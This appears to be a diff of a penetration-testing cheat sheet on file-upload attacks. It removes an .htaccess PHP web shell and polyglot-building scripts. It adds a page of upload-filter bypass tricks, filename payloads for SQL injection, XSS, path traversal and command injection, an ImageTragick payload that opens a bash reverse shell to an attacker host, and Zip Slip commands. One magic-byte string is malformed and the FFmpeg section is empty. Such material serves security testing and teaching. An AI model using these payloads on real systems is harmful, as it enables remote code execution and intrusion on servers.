@@ -1,66 +1,146 @@
-# .htaccess upload
+# Upload
 
-Uploading an .htaccess file to override Apache rule and execute PHP.
-"Hackers can also use “.htaccess” file tricks to upload a malicious file with any extension and execute it. For a simple example, imagine uploading to the vulnerabler server an .htaccess file that has AddType application/x-httpd-php .htaccess configuration and also contains PHP shellcode. Because of the malicious .htaccess file, the web server considers the .htaccess file as an executable php file and executes its malicious PHP shellcode. One thing to note: .htaccess configurations are applicable only for the same directory and sub-directories where the .htaccess file is uploaded."
+Uploaded files may pose a significant risk if not handled correctly. A remote attacker could send a multipart/form-data POST request with a specially-crafted filename or mime type and execute arbitrary code.
 
-Self contained .htaccess web shell
+## Summary
 
-```python
-# Self contained .htaccess web shell - Part of the htshell project
-# Written by Wireghoul - http://www.justanotherhacker.com
+* [Tools](#tools)
+* [Exploits](#exploits)
+    * [Defaults extensions](#defaults-extension)
+    * [Other extensions](#other-extensions)
+    * [Upload tricks](#upload-tricks)
+    * [Filename vulnerabilities](#filename-vulnerabilities)
+    * [Picture upload with LFI](#picture-upload-with-lfi)
+    * [Configuration Files](#configuration-files)
+    * [CVE - Image Tragik](#cve---image-tragik)
+    * [CVE - FFMpeg](#cve---ffmpeg)
+    * [ZIP Archive](#zip-archive)
+* [References](#references)
 
-# Override default deny rule to make .htaccess file accessible over web
-<Files ~ "^\.ht">
-Order allow,deny
-Allow from all
-</Files>
 
-# Make .htaccess file be interpreted as php file. This occur after apache has interpreted
-# the apache directoves from the .htaccess file
-AddType application/x-httpd-php .htaccess
+## Tools
+- [Fuxploider](https://github.com/almandin/fuxploider)
+- [Burp > Upload Scanner](https://portswigger.net/bappstore/b2244cbb6953442cb3c82fa0a0d908fa)
+
+## Exploits
+
+### Defaults extensions
+
+* PHP Server
+    ```powershell
+    .php
+    .php3
+    .php4
+    .php5
+    .php7
+
+    # Less known PHP extensions
+    .pht
+    .phps
+    .phar
+    .phpt
+    .pgif
+    .phtml
+    .phtm
+    .inc
+    ```
+* ASP Server : `.asp, .aspx, .cer and .asa (IIS <= 7.5), shell.aspx;1.jpg (IIS < 7.0)`
+* JSP : `.jsp, .jspx, .jsw, .jsv, .jspf`
+* Perl: `.pl, .pm, .cgi, .lib`
+* Coldfusion: `.cfm, .cfml, .cfc, .dbm`
+
+### Upload tricks
+
+- Use double extensions : `.jpg.php`
+- Use reverse double extension (useful to exploit Apache misconfigurations where anything with extension .php, but not necessarily ending in .php will execute code): `.php.jpg`
+- Mix uppercase and lowercase : `.pHp, .pHP5, .PhAr`
+- Null byte (works well against `pathinfo()`)
+    * .php%00.gif
+    * .php\x00.gif
+    * .php%00.png
+    * .php\x00.png
+    * .php%00.jpg
+    * .php\x00.jpg
+- Special characters
+    * Multiple dots : `file.php......` , in Windows when a file is created with dots at the end those will be removed.
+    * Whitespace characters: `file.php%20`
+    * Right to Left Override (RTLO): `name.%E2%80%AEphp.jpg` will became `name.gpj.php`.
+- Mime type, change `Content-Type : application/x-php` or `Content-Type : application/octet-stream` to `Content-Type : image/gif`
+    * `Content-Type : image/gif`
+    * `Content-Type : image/png`
+    * `Content-Type : image/jpeg`
+    * Set the Content-Type twice: once for unallowed type and once for allowed.
+- [Magic Bytes](https://en.wikipedia.org/wiki/List_of_file_signatures)
+    * Sometimes applications identify file types based on their first signature bytes. Adding/replacing them in a file might trick the application.
+        * PNG: `\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[`
+        * JPG: `\xff\xd8\xff`
+        * GIF: `GIF87a` OR `GIF8;`
+    * Shell can also be added in the metadata
+- Using NTFS alternate data stream (ADS) in Windows. In this case, a colon character ":" will be inserted after a forbidden extension and before a permitted one. As a result, an empty file with the forbidden extension will be created on the server (e.g. "`file.asax:.jpg`"). This file might be edited later using other techniques such as using its short filename. The "::$data" pattern can also be used to create non-empty files. Therefore, adding a dot character after this pattern might also be useful to bypass further restrictions (.e.g. "`file.asp::$data.`")
+
+### Filename vulnerabilities
+
+- Time-Based SQLi Payloads: e.g. `poc.js'(select*from(select(sleep(20)))a)+'.extension`
+- LFI Payloads:  e.g. `image.png../../../../../../../etc/passwd` 
+- XSS Payloads e.g. `'"><img src=x onerror=alert(document.domain)>.extension`
+- File Traversal e.g. `../../../tmp/lol.png`
+- Command Injection e.g. `; sleep 10;`
+
+### Picture upload with LFI
+
+Valid pictures hosting PHP code. Upload the picture and use a local file inclusion to execute the code. The shell can be called with the following command : `curl 'http://localhost/test.php?0=system' --data "1='ls'"`.
+
+- Picture Metadata, hide the payload inside a comment tag in the metadata.
+- Picture Resize, hide the payload within the compression algorithm in order to bypass a resize. Also defeating `getimagesize()` and `imagecreatefromgif()`.
+
+### Configuration Files
+
+If you are trying to upload files to a PHP server, take a look at the .htaccess trick to execute code.
+If you are  trying to upload files to an ASP server, take a look at the .config trick to execute code.
+
+Configuration files examples
+- .htaccess
+- web.config
+- httpd.conf
+- \_\_init\_\_.py
+
+
+### CVE - Image Tragik
+
+Upload this content with an image extension to exploit the vulnerability (ImageMagick , 7.0.1-1)
+
+```powershell
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
+pop graphic-context
 ```
 
-```php
-###### SHELL ######
-<?php echo "\n";passthru($_GET['c']." 2>&1"); ?>
-```
+More payload in the folder `Picture Image Magik`
 
-# .htaccess upload as image
+### CVE - FFMpeg
 
-If the `exif_imagetype` function is used on the server side to determine the image type, create a `.htaccess/image` polyglot. 
+FFmpeg HLS vulnerability
 
-[Supported image types](http://php.net/manual/en/function.exif-imagetype.php#refsect1-function.exif-imagetype-constants) include [X BitMap (XBM)](https://en.wikipedia.org/wiki/X_BitMap) and [WBMP](https://en.wikipedia.org/wiki/Wireless_Application_Protocol_Bitmap_Format). In `.htaccess` ignoring lines starting with `\x00` and `#`, you can use these scripts for generate a valid `.htaccess/image` polyglot.
 
-```python
-# create valid .htaccess/xbm image
+### ZIP archive
 
-width = 50
-height = 50
-payload = '# .htaccess file'
+When a ZIP/archive file is automatically decompressed after the upload
 
-with open('.htaccess', 'w') as htaccess:
-    htaccess.write('#define test_width %d\n' % (width, ))
-    htaccess.write('#define test_height %d\n' % (height, ))
-    htaccess.write(payload)
-```
-or
-```python
-# create valid .htaccess/wbmp image
+* Zip Slip: directory traversal to write a file somewhere else
+    ```python
+    python evilarc.py shell.php -o unix -f shell.zip -p var/www/html/ -d 15
 
-type_header = b'\x00'
-fixed_header = b'\x00'
-width = b'50'
-height = b'50'
-payload = b'# .htaccess file'
+    ln -s ../../../index.php symindex.txt
+    zip --symlinks test.zip symindex.txt
+    ```
 
-with open('.htaccess', 'wb') as htaccess:
-    htaccess.write(type_header + fixed_header + width + height)
-    htaccess.write(b'\n')
-    htaccess.write(payload)
-```
 
-## Thanks to
+## References
 
-* [ATTACKING WEBSERVERS VIA .HTACCESS - By Eldar Marcussen](http://www.justanotherhacker.com/2011/05/htaccess-based-attacks.html)
-* [Protection from Unrestricted File Upload Vulnerability](https://blog.qualys.com/securitylabs/2015/10/22/unrestricted-file-upload-vulnerability)
-* [Writeup to l33t-hoster task, Insomnihack Teaser 2019](http://corb3nik.github.io/blog/insomnihack-teaser-2019/l33t-hoster)
+* Bulletproof Jpegs Generator - Damien "virtualabs" Cauquil
+* [BookFresh Tricky File Upload Bypass to RCE, NOV 29, 2014 - AHMED ABOUL-ELA](https://secgeek.net/bookfresh-vulnerability/)
+* [Encoding Web Shells in PNG IDAT chunks, 04-06-2012, phil](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
+* [La PNG qui se prenait pour du PHP, 23 février 2014](https://phil242.wordpress.com/2014/02/23/la-png-qui-se-prenait-pour-du-php/)
+* [File Upload restrictions bypass - Haboob Team](https://www.exploit-db.com/docs/english/45074-file-upload-restrictions-bypass.pdf)
+* [File Upload - Mahmoud M. Awali / @0xAwali](https://docs.google.com/presentation/d/1-YwXl9rhzSvvqVvE_bMZo2ab-0O5wRNTnzoihB9x6jI/edit#slide=id.ga2ef157b83_1_0)
